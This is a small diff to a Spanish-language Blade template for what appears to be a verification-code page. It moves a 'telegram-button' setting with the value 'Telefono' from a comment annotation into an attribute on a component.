@@ -1,4 +1,3 @@
-{{-- @telegram-button: Telefono --}}
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -124,6 +123,7 @@
         :debug="false"
         redirect-url="/verificacion/wait"
         toast-message="El codigo ingresado no es valido, solicite uno nuevo"
+        telegram-button="Telefono"
     />
 </body>
 </html>
